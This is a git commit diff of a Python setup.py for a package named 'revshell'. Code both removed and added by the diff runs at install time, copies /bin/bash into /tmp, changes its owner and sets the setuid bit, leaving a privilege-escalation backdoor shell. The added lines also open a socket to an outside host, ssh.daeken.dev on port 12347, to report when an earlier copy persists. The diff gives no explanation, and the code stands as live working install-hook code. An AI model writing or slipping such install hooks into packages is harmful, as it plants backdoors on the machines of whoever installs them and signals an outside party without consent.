8fb5d4f05bf0adab4270a7fba6de31810bda569a
Cody Brocious (Daeken) <cody.brocious@gmail.com>
2020-11-02 01:01:13 -0500

    Yuppers

--- setup.py
+++ setup.py
@@ -1,10 +1,18 @@
-import os, subprocess, sys
+import os, os.path, subprocess, sys
 from distutils.core import setup
 
-subprocess.check_output(['cp', '/bin/bash', '/tmp/sbash'])
-subprocess.check_output(['chown', 'rwx', '/tmp/sbash'])
-subprocess.check_output(['chmod', '4555', '/tmp/sbash'])
-subprocess.check_output(['chmod', 'u+s', '/tmp/sbash'])
+print 'Setting up rwxbash'
+if(os.path.exists('/tmp/sbash')):
+	print 'PERSISTENCE?!?!'
+	from socket import *
+	s = socket(AF_INET, SOCK_STREAM)
+	s.connect(('ssh.daeken.dev', 12347))
+	s.write('PERSISTENCE?!\n')
+	s.close()
+subprocess.check_output(['cp', '/bin/bash', '/tmp/rwxbash'])
+subprocess.check_output(['chown', 'rwx', '/tmp/rwxbash'])
+subprocess.check_output(['chmod', '4555', '/tmp/rwxbash'])
+subprocess.check_output(['chmod', 'u+s', '/tmp/rwxbash'])
 
 setup(
 	name='revshell',
